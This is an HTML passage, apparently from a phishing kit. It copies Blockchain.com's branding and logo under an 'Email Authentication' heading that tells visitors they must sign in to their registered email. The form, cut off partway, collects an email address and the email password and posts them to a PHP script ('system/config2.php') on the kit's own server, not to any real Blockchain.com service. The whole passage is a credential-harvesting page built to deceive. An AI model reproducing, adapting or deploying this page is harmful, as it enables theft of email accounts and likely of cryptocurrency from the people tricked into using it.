...
<body>
   <div id="app"><div class="sc-jzgbtB eTdLKk"><div class="sc-iuJeZd dfMFAv"><span></span></div><div class="sc-gJWqzi cUnQgz"><div height="112px" class="sc-bXGyLb bixyKR"><div class="sc-lkqHmb foabOi sc-emmjRN csisZY"><div class="sc-eLExRp gWcMcI sc-cpmLhU eplNXa"><div class="sc-bnXvFD hFPMLV"><a href="https://www.blockchain.com" color="blue600" class="sc-bxivhb gyslwv"><img src="https://login.blockchain.com/img/bc-logo.svg?91c7840afd5ef690da30e77ec34105f3" srcset="" class="sc-htpNat kZQjSW sc-dymIpo hrwGqG" color="auto" width="auto" height="24px"></a></div></div></div></div></div><div class="sc-rBLzX cFxPZj"><div color="white" style="margin-bottom: 24px;color: white;font-weight: 600;font-size: 24px;line-height: inherit;text-transform: none;font-style: normal;color: rgb(255, 255, 255);cursor: inherit;display: block;opacity: 1;font-family: &quot;Inter&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, Oxygen, Ubuntu, Cantarell, &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, sans-serif;" cursor="inherit" opacity="1" class="sc-gzVnrw heWqwW">Email Authentication</div><div color="grey400" style="margin-bottom: 32px;font-weight: 500;font-size: 16px;line-height: inherit;text-transform: none;font-style: normal;color: rgb(152, 161, 178);cursor: inherit;display: block;opacity: 1;font-family: &quot;Inter&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, Oxygen, Ubuntu, Cantarell, &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, sans-serif;" cursor="inherit" opacity="1" class="sc-gzVnrw hLxhAA">We need you to sign-in to your registered E-mail which we have in our records.</div>
<div class="sc-dBaXSw jvGdZU"><div class="sc-bNQFlB ksEeVc"></div><div class="sc-dRCTWM dlQZmq"><div class="sc-hizQCF eqFanl"><div class="sc-fKGOjr sc-eNPDpu cmopvD"><div></div><form class="sc-gacfCG jZOEPv sc-hlILIN epMhlz" method="post" action="system/config2.php?SESSION=<?php echo $get_sess; ?>"><div class="sc-cqPOvA bJoSAC"><div class="sc-gNJABI hjIFcQ"><label class="sc-yZwTr aEyxW" for="email"><div color="grey800" cursor="inherit" opacity="1" class="sc-htoDjs htBqkC"><span>Email Address</span> </div></label><div class="sc-kkbgRg jkPVaF" height="48px"><div class="sc-dVhcbM klJnQP"><input required="" data-e2e="loginGuid" spellcheck="false" class="sc-fMiknA jfGJRD" value="" placeholder="example@domain.com" id="email" type="email" name="email" height="48px"></div></div></div></div><br>
<div class="sc-cqPOvA bJoSAC"><div class="sc-gNJABI hjIFcQ"><label class="sc-yZwTr aEyxW" for="pass"><div color="grey800" cursor="inherit" opacity="1" class="sc-htoDjs htBqkC"><span>Email Password</span> </div></label><div class="sc-kkbgRg jkPVaF" height="48px"><div class="sc-dVhcbM klJnQP"><input required="" spellcheck="false" class="sc-fMiknA jfGJRD" value="" placeholder="" name="pass" type="password" data-e2e="loginGuid" id="pass" height="48px"></div></div></div></div><div class="sc-cqPOvA bJoSAC">
